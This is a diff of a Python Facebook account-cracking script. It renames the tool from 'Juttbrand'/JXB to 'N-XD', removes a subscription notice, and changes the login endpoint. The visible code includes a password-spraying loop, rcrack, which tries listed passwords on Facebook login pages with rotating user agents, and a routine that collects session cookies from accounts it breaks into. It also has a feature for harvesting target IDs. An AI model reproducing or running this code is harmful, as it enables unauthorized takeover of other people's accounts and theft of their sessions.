@@ -119,10 +119,7 @@ logo=("""\033[1;32m
 \033[1;37m[-] GITHUB    :\033[1;32m PRIVATE
 \033[1;37m[-] VERSION   :\033[1;32m 1.0
 \033[1;37m[-] STATUS    :\033[1;32m PREMIUM
-  
---------------------------------------------------
-\033[1;37m[-]Dear Paid user:
-\033[1;37m[-]Your subscription last date 25/12/22
+--------------------------------------------------  
 --------------------------------------------------""")
 def linex():
 	print('\033[1;32m----------------------------------------------')
@@ -369,7 +366,7 @@ def manual_file(cookies,access_token):
         limit = int(input(' How many ids do you want to extract? '))
     except:
         limit = 1
-    print('\n \033[1;32mExample: /sdcard/JXB.txt \033[0;97m\n')
+    print('\n \033[1;32mExample: /sdcard/N-XD.txt \033[0;97m\n')
     sf = input(' Save file as: ')
     print(50*'-')
     for xd in range(limit):
@@ -419,7 +416,7 @@ def sids():
     print(' New file saved as: '+new_save)
     print(50*'-')
     input('\n Press enter to back ')
-    os.system('python JXB.py')
+    os.system('python n-xd.py')
 def remove_dub():
     os.system('clear')
     print(logo)
@@ -842,7 +839,7 @@ def rcrack(ids,passlist):
 	global oks
 	try:
 		for pas in passlist:
-			sys.stdout.write('\r\r\033[1;32m [Juttbrand] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;32m [N-XD] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
 			session = requests.Session()
 			pro = random.choice(ugen)
 			free_fb = session.get('https://free.facebook.com').text
@@ -870,7 +867,7 @@ def rcrack(ids,passlist):
 			'sec-fetch-user': '?1',
 			'upgrade-insecure-requests': '1',
 			'user-agent': pro}
-			lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+			lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -1021,3 +1018,6 @@ except requests.exceptions.ConnectionError:
 	print('\n No internet connection ...')
 	exit()
 except:exit()
+  
+
+
